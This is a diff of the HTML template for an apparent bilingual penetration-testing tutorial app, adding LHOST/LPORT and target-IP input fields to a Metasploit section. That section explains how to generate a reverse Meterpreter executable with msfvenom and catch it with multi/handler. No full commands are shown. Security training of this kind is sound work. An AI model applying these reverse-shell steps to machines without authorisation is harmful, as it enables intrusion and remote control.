+            <div class="flex gap-2 flex-wrap" style="margin-top: var(--space-4);">
+                <button class="btn btn-outline btn-sm" onclick="Commands.copyAllTrailCommands()"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar Todos</span><span data-lang-en>Copy All</span></button>
+                <button class="btn btn-outline btn-sm" onclick="Commands.downloadTrailScript('Metasploit_Exploitation')"><i class="fa-solid fa-download"></i> <span data-lang-pt>Baixar Script (.sh)</span><span data-lang-en>Download Script (.sh)</span></button>
             </div>
         </div>
     </div>
@@ -1796,6 +1448,20 @@
             <span data-lang-pt>O <code>msfvenom</code> é a ferramenta usada para gerar payloads em diversos formatos (Windows exe, Linux elf, PHP, ASPX). Geraremos um executável reverso do Meterpreter que se conectará de volta à nossa máquina Kali.</span>
             <span data-lang-en><code>msfvenom</code> is used to build payloads in multiple formats (Windows exe, Linux elf, PHP, ASPX). We will generate a reverse Meterpreter executable that connects back to our Kali machine.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-danger);">
+            <div class="phase-inputs-title" style="color: var(--accent-danger);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>Seu IP e porta para o shell reverso</span><span data-lang-en>Your IP and port for the reverse shell</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>Seu IP (LHOST)</span><span data-lang-en>Your IP (LHOST)</span></label>
+                    <input type="text" id="lhost" value="10.10.14.5" data-cmd-input>
+                    <span class="input-hint"><span data-lang-pt>IP da sua máquina Kali Linux para receber o shell reverso</span><span data-lang-en>Your Kali Linux IP address to receive the reverse shell connection</span></span>
+                </div>
+                <div class="input-group">
+                    <label><span data-lang-pt>Porta Local (LPORT)</span><span data-lang-en>Local Port (LPORT)</span></label>
+                    <input type="text" id="lport" value="4444" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Criar Executável</span><span data-lang-en>Create Executable</span></div>
             <div class="command-box">
@@ -1814,6 +1480,15 @@
             <span data-lang-pt>Precisamos abrir uma porta no Kali para aguardar a conexão do payload. Usamos o módulo <code>exploit/multi/handler</code> no console do Metasploit.</span>
             <span data-lang-en>We need to open a listening port on Kali to wait for the payload connection. We use the <code>exploit/multi/handler</code> module in the Metasploit console.</span>
         </p>
+        <div class="phase-inputs" style="border-left-color: var(--accent-danger);">
+            <div class="phase-inputs-title" style="color: var(--accent-danger);"><i class="fa-solid fa-pen-to-square"></i> <span data-lang-pt>IP do alvo (máquina que executará o payload)</span><span data-lang-en>Target IP (machine that will run the payload)</span></div>
+            <div class="form-row">
+                <div class="input-group">
+                    <label><span data-lang-pt>IP do Alvo (RHOSTS)</span><span data-lang-en>Target IP (RHOSTS)</span></label>
+                    <input type="text" id="target" value="192.168.1.100" data-cmd-input>
+                </div>
+            </div>
+        </div>
         <div class="action-area">
             <div class="action-title"><i class="fa-solid fa-terminal"></i> msfconsole</div>
             <span class="command-label"><span data-lang-pt>1. Iniciar console do Metasploit:</span><span data-lang-en>1. Start Metasploit console:</span></span>
@@ -1890,7 +1565,6 @@
         </div>
     </div>
 </div>
-
     </template>
     <template id="template-arsenal">
 <!-- ARSENAL — Catálogo de Ferramentas com Cheatsheets -->
